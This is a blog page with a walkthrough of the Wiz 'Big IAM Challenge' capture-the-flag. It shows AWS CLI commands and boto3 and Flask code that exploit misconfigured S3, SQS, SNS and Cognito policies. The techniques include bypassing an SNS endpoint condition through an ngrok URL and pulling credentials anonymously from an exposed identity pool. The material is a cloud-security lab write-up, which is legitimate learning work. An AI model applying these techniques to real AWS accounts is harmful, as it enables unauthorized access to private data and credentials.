<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self' https://www.dropbox.com https://*.dl.dropboxusercontent.com https://photos.app.goo.gl https://drive.google.com https://photos.google.com https://video-downloads.googleusercontent.com https://*.googleusercontent.com https://*.googlevideo.com https://youtube.googleapis.com; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self' https://w.soundcloud.com https://www.youtube.com https://www.youtube-nocookie.com https://www.dropbox.com http://localhost https://www.dropbox.com http://darvein.local https://disqus.com; img-src 'self' https://photos.google.com https://lh3.googleusercontent.com https://www.dropbox.com https://*.dl.dropboxusercontent.com https://*.disqus.com https://c.disquscdn.com; object-src https://lh3.googleusercontent.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/ https://c.disquscdn.com; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdnjs.cloudflare.com https://www.googletagmanager.com https://www.dropbox.com http://localhost http://darvein.local https://drv21.disqus.com https://c.disquscdn.com; prefetch-src 'self' https://youtube.googleapis.com; connect-src 'self' https://www.google-analytics.com https://links.services.disqus.com;"><meta name=author content="Dennis Ruiz"><meta name=description content="AWS IAM Challenge challenge 1 All you need to is to use awscli to navigate a S3 Bucket:
aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt -
challenge 2 In order to pass this one you just need to pull messages from the queue:
aws sqs receive-message \ --queue-url https://sqs.us-east-1.amazonaws.com/XXXXX/XXXXX challenge 3 This policy is given, we just need to subscribe to the SNS topic and bypass the condition which is *@tbic.wiz.io.
{ &#34;Version&#34;: &#34;2008-10-17&#34;, &#34;Id&#34;: &#34;Statement1&#34;, &#34;Statement&#34;: [ { &#34;Sid&#34;: &#34;Statement1&#34;, &#34;Effect&#34;: &#34;Allow&#34;, &#34;Principal&#34;: { &#34;AWS&#34;: &#34;*&#34; }, &#34;Action&#34;: &#34;SNS:Subscribe&#34;, &#34;Resource&#34;: &#34;arn:aws:sns:us-east-1:123123123123:TBICWizPushNotifications&#34;, &#34;Condition&#34;: { &#34;StringLike&#34;: { &#34;sns:Endpoint&#34;: &#34;*@tbic."><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="AWS IAM Challenge challenge 1 All you need to is to use awscli to navigate a S3 Bucket:
aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt -
challenge 2 In order to pass this one you just need to pull messages from the queue:
aws sqs receive-message \ --queue-url https://sqs.us-east-1.amazonaws.com/XXXXX/XXXXX challenge 3 This policy is given, we just need to subscribe to the SNS topic and bypass the condition which is *@tbic.wiz.io.
{ &#34;Version&#34;: &#34;2008-10-17&#34;, &#34;Id&#34;: &#34;Statement1&#34;, &#34;Statement&#34;: [ { &#34;Sid&#34;: &#34;Statement1&#34;, &#34;Effect&#34;: &#34;Allow&#34;, &#34;Principal&#34;: { &#34;AWS&#34;: &#34;*&#34; }, &#34;Action&#34;: &#34;SNS:Subscribe&#34;, &#34;Resource&#34;: &#34;arn:aws:sns:us-east-1:123123123123:TBICWizPushNotifications&#34;, &#34;Condition&#34;: { &#34;StringLike&#34;: { &#34;sns:Endpoint&#34;: &#34;*@tbic."><meta property="og:title" content><meta property="og:description" content="AWS IAM Challenge challenge 1 All you need to is to use awscli to navigate a S3 Bucket:
aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt -
challenge 2 In order to pass this one you just need to pull messages from the queue:
aws sqs receive-message \ --queue-url https://sqs.us-east-1.amazonaws.com/XXXXX/XXXXX challenge 3 This policy is given, we just need to subscribe to the SNS topic and bypass the condition which is *@tbic.wiz.io.
{ &#34;Version&#34;: &#34;2008-10-17&#34;, &#34;Id&#34;: &#34;Statement1&#34;, &#34;Statement&#34;: [ { &#34;Sid&#34;: &#34;Statement1&#34;, &#34;Effect&#34;: &#34;Allow&#34;, &#34;Principal&#34;: { &#34;AWS&#34;: &#34;*&#34; }, &#34;Action&#34;: &#34;SNS:Subscribe&#34;, &#34;Resource&#34;: &#34;arn:aws:sns:us-east-1:123123123123:TBICWizPushNotifications&#34;, &#34;Condition&#34;: { &#34;StringLike&#34;: { &#34;sns:Endpoint&#34;: &#34;*@tbic."><meta property="og:type" content="article"><meta property="og:url" content="https://www.darvein.net/devops/aws/awsiam-challenge/"><meta property="article:section" content="devops"><title>AWS IAM Challenge </title><link rel=canonical href=https://www.darvein.net/devops/aws/awsiam-challenge/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a1a7e7e7bd8b6629931805334fd6cf056ee6f154702847e6d597bbfe80446a0d.css integrity="sha256-oafn572LZimTGAUzT9bPBW7m8VRwKEfm1Ze7/oBEag0=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.39e41a7f16bdf8cb16e43cae7d714fa1016f1d2d2898a5b3f27f42c9979204e2.css integrity="sha256-OeQafxa9+MsW5DyufXFPoQFvHS0omKWz8n9CyZeSBOI=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/custom.min.7cf8a329bb485491ed5be45bd286916c655bf66e11e3fe4d82649437eae8b51b.css integrity="sha256-fPijKbtIVJHtW+Rb0oaRbGVb9m4R4/5NgmSUN+rotRs=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.120.4"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Darvein
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/infosec/>Infosec</a></li><li class=navigation-item><a class=navigation-link href=/coding/>Coding</a></li><li class=navigation-item><a class=navigation-link href=/devops/>Devops</a></li></ul></section></nav><div class=content><section class="container page"><article><h1 id=aws-iam-challenge>AWS IAM Challenge
<a class=heading-link href=#aws-iam-challenge><i class="fa fa-link" aria-hidden=true></i></a></h1><h2 id=challenge-1>challenge 1
<a class=heading-link href=#challenge-1><i class="fa fa-link" aria-hidden=true></i></a></h2><p>All you need to is to use <strong>awscli</strong> to navigate a S3 Bucket:</p><p><code>aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt -</code></p><h2 id=challenge-2>challenge 2
<a class=heading-link href=#challenge-2><i class="fa fa-link" aria-hidden=true></i></a></h2><p>In order to pass this one you just need to pull messages from the queue:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>aws sqs receive-message <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>        --queue-url https://sqs.us-east-1.amazonaws.com/XXXXX/XXXXX
</span></span></code></pre></div><h2 id=challenge-3>challenge 3
<a class=heading-link href=#challenge-3><i class="fa fa-link" aria-hidden=true></i></a></h2><p>This policy is given, we just need to subscribe to the SNS topic and bypass the condition which is <code>*@tbic.wiz.io</code>.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>&#34;Version&#34;</span>: <span style=color:#0086d2>&#34;2008-10-17&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>&#34;Id&#34;</span>: <span style=color:#0086d2>&#34;Statement1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>&#34;Statement&#34;</span>: [
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Sid&#34;</span>: <span style=color:#0086d2>&#34;Statement1&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Effect&#34;</span>: <span style=color:#0086d2>&#34;Allow&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Principal&#34;</span>: {
</span></span><span style=display:flex><span>                <span style=color:#fb660a;font-weight:700>&#34;AWS&#34;</span>: <span style=color:#0086d2>&#34;*&#34;</span>
</span></span><span style=display:flex><span>            },
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Action&#34;</span>: <span style=color:#0086d2>&#34;SNS:Subscribe&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Resource&#34;</span>: <span style=color:#0086d2>&#34;arn:aws:sns:us-east-1:123123123123:TBICWizPushNotifications&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Condition&#34;</span>: {
</span></span><span style=display:flex><span>                <span style=color:#fb660a;font-weight:700>&#34;StringLike&#34;</span>: {
</span></span><span style=display:flex><span>                    <span style=color:#fb660a;font-weight:700>&#34;sns:Endpoint&#34;</span>: <span style=color:#0086d2>&#34;*@tbic.wiz.io&#34;</span>
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    ]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Then we create a simple web server with that bypassing http endpoint and then print any response with a <code>print()</code>, flag appears there:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#fb660a;font-weight:700>from</span> flask <span style=color:#fb660a;font-weight:700>import</span> Flask, request
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>import</span> json
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app = Flask(__name__)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>@app.route(<span style=color:#0086d2>&#39;/blah@tbic.wiz.io&#39;</span>, methods=[<span style=color:#0086d2>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>handle_notification</span>():
</span></span><span style=display:flex><span>    message = json.loads(request.data)
</span></span><span style=display:flex><span>    print(message)
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#0086d2>&#39;OK&#39;</span>, <span style=color:#0086f7;font-weight:700>200</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>if</span> __name__ == <span style=color:#0086d2>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    app.run(port=<span style=color:#0086f7;font-weight:700>5000</span>)
</span></span></code></pre></div><p>Once we have running our custom web server, we expose it to internet with <code>ngrok</code>, we get the public endpoint and finally subscribe to the SNS:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>aws sns subscribe <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>        --topic-arn arn:aws:sns:us-east-1:123123123123:TBICWizPushNotifications <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>        --protocol https <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>        --notification-endpoint <span style=color:#0086d2>&#39;https://104c-2800-cd0-c42-2700-e1df-d5ec.sa.ngrok.io/blah@tbic.wiz.io&#39;</span>
</span></span></code></pre></div><p>Then we have to pay attention to our Flask console logs, flag is sent there from AWS.</p><h2 id=challenge-4>challenge 4
<a class=heading-link href=#challenge-4><i class="fa fa-link" aria-hidden=true></i></a></h2><p>Now this Policy is given. Notice that any <code>Principal</code> is allowed to make requests.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>&#34;Version&#34;</span>: <span style=color:#0086d2>&#34;2012-10-17&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>&#34;Statement&#34;</span>: [
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Effect&#34;</span>: <span style=color:#0086d2>&#34;Allow&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Principal&#34;</span>: <span style=color:#0086d2>&#34;*&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Action&#34;</span>: <span style=color:#0086d2>&#34;s3:GetObject&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Resource&#34;</span>: <span style=color:#0086d2>&#34;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*&#34;</span>
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Effect&#34;</span>: <span style=color:#0086d2>&#34;Allow&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Principal&#34;</span>: <span style=color:#0086d2>&#34;*&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Action&#34;</span>: <span style=color:#0086d2>&#34;s3:ListBucket&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Resource&#34;</span>: <span style=color:#0086d2>&#34;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Condition&#34;</span>: {
</span></span><span style=display:flex><span>                <span style=color:#fb660a;font-weight:700>&#34;StringLike&#34;</span>: {
</span></span><span style=display:flex><span>                    <span style=color:#fb660a;font-weight:700>&#34;s3:prefix&#34;</span>: <span style=color:#0086d2>&#34;files/*&#34;</span>
</span></span><span style=display:flex><span>                },
</span></span><span style=display:flex><span>                <span style=color:#fb660a;font-weight:700>&#34;ForAllValues:StringLike&#34;</span>: {
</span></span><span style=display:flex><span>                    <span style=color:#fb660a;font-weight:700>&#34;aws:PrincipalArn&#34;</span>: <span style=color:#0086d2>&#34;arn:aws:iam::133713371337:user/admin&#34;</span>
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    ]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>So we just skip authentication with <code>--no-sign-request</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/
</span></span><span style=display:flex><span>aws s3 cp --no-sign-request s3://thebigiamchallenge-admin-storage-abf1321/files/flag2.txt -
</span></span></code></pre></div><h2 id=challenge-5>challenge 5
<a class=heading-link href=#challenge-5><i class="fa fa-link" aria-hidden=true></i></a></h2><p>On this one, you will realize that the website is using Cognito as Identity Provider, the trick here is that the pool id is being exposed (in the same web page) and people can anonymously get AWS Credentials.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>&#34;Version&#34;</span>: <span style=color:#0086d2>&#34;2012-10-17&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>&#34;Statement&#34;</span>: [
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Sid&#34;</span>: <span style=color:#0086d2>&#34;VisualEditor0&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Effect&#34;</span>: <span style=color:#0086d2>&#34;Allow&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Action&#34;</span>: [
</span></span><span style=display:flex><span>                <span style=color:#0086d2>&#34;mobileanalytics:PutEvents&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#0086d2>&#34;cognito-sync:*&#34;</span>
</span></span><span style=display:flex><span>            ],
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Resource&#34;</span>: <span style=color:#0086d2>&#34;*&#34;</span>
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Sid&#34;</span>: <span style=color:#0086d2>&#34;VisualEditor1&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Effect&#34;</span>: <span style=color:#0086d2>&#34;Allow&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Action&#34;</span>: [
</span></span><span style=display:flex><span>                <span style=color:#0086d2>&#34;s3:GetObject&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#0086d2>&#34;s3:ListBucket&#34;</span>
</span></span><span style=display:flex><span>            ],
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Resource&#34;</span>: [
</span></span><span style=display:flex><span>                <span style=color:#0086d2>&#34;arn:aws:s3:::wiz-privatefiles&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#0086d2>&#34;arn:aws:s3:::wiz-privatefiles/*&#34;</span>
</span></span><span style=display:flex><span>            ]
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    ]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>So we just need to grab the pool id and request AWS Credentials:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#fb660a;font-weight:700>import</span> boto3
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>identity_pool_id = <span style=color:#0086d2>&#39;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&#39;</span>
</span></span><span style=display:flex><span>identity_client = boto3.client(<span style=color:#0086d2>&#39;cognito-identity&#39;</span>, <span style=color:#0086d2>&#39;us-east-1&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>identity_response = identity_client.get_id(IdentityPoolId=identity_pool_id)
</span></span><span style=display:flex><span>creds = identity_client.get_credentials_for_identity(IdentityId=identity_response[<span style=color:#0086d2>&#39;IdentityId&#39;</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#0086d2>f</span><span style=color:#0086d2>&#34;export AWS_ACCESS_KEY_ID=</span><span style=color:#0086d2>{</span>creds[<span style=color:#0086d2>&#39;Credentials&#39;</span>][<span style=color:#0086d2>&#39;AccessKeyId&#39;</span>]<span style=color:#0086d2>}</span><span style=color:#0086d2>&#34;</span>)
</span></span><span style=display:flex><span>print(<span style=color:#0086d2>f</span><span style=color:#0086d2>&#34;export AWS_SECRET_ACCESS_KEY=</span><span style=color:#0086d2>{</span>creds[<span style=color:#0086d2>&#39;Credentials&#39;</span>][<span style=color:#0086d2>&#39;SecretKey&#39;</span>]<span style=color:#0086d2>}</span><span style=color:#0086d2>&#34;</span>)
</span></span><span style=display:flex><span>print(<span style=color:#0086d2>f</span><span style=color:#0086d2>&#34;export AWS_SESSION_TOKEN=</span><span style=color:#0086d2>{</span>creds[<span style=color:#0086d2>&#39;Credentials&#39;</span>][<span style=color:#0086d2>&#39;SessionToken&#39;</span>]<span style=color:#0086d2>}</span><span style=color:#0086d2>&#34;</span>)
</span></span></code></pre></div><p>Now we can grab the flag:
<code>aws s3 cp s3://wiz-privatefiles/flag1.txt -</code></p><h2 id=challenge-6>challenge 6
<a class=heading-link href=#challenge-6><i class="fa fa-link" aria-hidden=true></i></a></h2><p>This one is similar to the previous, the only thing here is that we have to Assume a Role with Web Identity.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>&#34;Version&#34;</span>: <span style=color:#0086d2>&#34;2012-10-17&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>&#34;Statement&#34;</span>: [
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Effect&#34;</span>: <span style=color:#0086d2>&#34;Allow&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Principal&#34;</span>: {
</span></span><span style=display:flex><span>                <span style=color:#fb660a;font-weight:700>&#34;Federated&#34;</span>: <span style=color:#0086d2>&#34;cognito-identity.amazonaws.com&#34;</span>
</span></span><span style=display:flex><span>            },
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Action&#34;</span>: <span style=color:#0086d2>&#34;sts:AssumeRoleWithWebIdentity&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>&#34;Condition&#34;</span>: {
</span></span><span style=display:flex><span>                <span style=color:#fb660a;font-weight:700>&#34;StringEquals&#34;</span>: {
</span></span><span style=display:flex><span>                    <span style=color:#fb660a;font-weight:700>&#34;cognito-identity.amazonaws.com:aud&#34;</span>: <span style=color:#0086d2>&#34;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&#34;</span>
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    ]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#fb660a;font-weight:700>import</span> boto3
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>identity_pool_id = <span style=color:#0086d2>&#39;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&#39;</span>
</span></span><span style=display:flex><span>identity_client = boto3.client(<span style=color:#0086d2>&#39;cognito-identity&#39;</span>, <span style=color:#0086d2>&#39;us-east-1&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>role_to_assume_arn = <span style=color:#0086d2>&#39;arn:aws:iam::123123123123:role/Cognito_s3accessAuth_Role&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>identity_response = identity_client.get_id(IdentityPoolId=identity_pool_id)
</span></span><span style=display:flex><span>identity_id = identity_response[<span style=color:#0086d2>&#39;IdentityId&#39;</span>]
</span></span><span style=display:flex><span>creds = identity_client.get_credentials_for_identity(IdentityId=identity_response[<span style=color:#0086d2>&#39;IdentityId&#39;</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cognito_client = boto3.client(<span style=color:#0086d2>&#39;cognito-identity&#39;</span>, <span style=color:#0086d2>&#39;us-east-1&#39;</span>)
</span></span><span style=display:flex><span>open_id_token_response = cognito_client.get_open_id_token(IdentityId=identity_id)
</span></span><span style=display:flex><span>open_id_token = open_id_token_response[<span style=color:#0086d2>&#39;Token&#39;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sts_client = boto3.client(<span style=color:#0086d2>&#39;sts&#39;</span>)
</span></span><span style=display:flex><span>creds = sts_client.assume_role_with_web_identity(
</span></span><span style=display:flex><span>    RoleArn=role_to_assume_arn,
</span></span><span style=display:flex><span>    RoleSessionName=<span style=color:#0086d2>&#39;AssumeRoleSession&#39;</span>,
</span></span><span style=display:flex><span>    WebIdentityToken=open_id_token,
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#0086d2>f</span><span style=color:#0086d2>&#34;export AWS_ACCESS_KEY_ID=</span><span style=color:#0086d2>{</span>creds[<span style=color:#0086d2>&#39;Credentials&#39;</span>][<span style=color:#0086d2>&#39;AccessKeyId&#39;</span>]<span style=color:#0086d2>}</span><span style=color:#0086d2>&#34;</span>)
</span></span><span style=display:flex><span>print(<span style=color:#0086d2>f</span><span style=color:#0086d2>&#34;export AWS_SECRET_ACCESS_KEY=</span><span style=color:#0086d2>{</span>creds[<span style=color:#0086d2>&#39;Credentials&#39;</span>][<span style=color:#0086d2>&#39;SecretAccessKey&#39;</span>]<span style=color:#0086d2>}</span><span style=color:#0086d2>&#34;</span>)
</span></span><span style=display:flex><span>print(<span style=color:#0086d2>f</span><span style=color:#0086d2>&#34;export AWS_SESSION_TOKEN=</span><span style=color:#0086d2>{</span>creds[<span style=color:#0086d2>&#39;Credentials&#39;</span>][<span style=color:#0086d2>&#39;SessionToken&#39;</span>]<span style=color:#0086d2>}</span><span style=color:#0086d2>&#34;</span>)
</span></span></code></pre></div><p>And now we can grab the flag:
<code>aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt -</code></p></article></section></div><footer class=footer><section class=container>©
2021 -
2024
Dennis Ruiz
·
Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js integrity="sha256-I2BJOV3DaC+ycZZAhylY4S8fJAZ7sJwyeyM+YpDH7aw="></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-6CQZY8W0WD"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6CQZY8W0WD")</script><script>$(document).on("input propertychange paste change",".FilterSearch",function(){var n=$(this).val().toLowerCase(),s=$(this).closest("ul"),t=s.find("li:gt(0)");t.hide(),t.filter(function(){var e=$(this).text().toLowerCase();return e.indexOf(n)>=0}).show()})</script></body></html>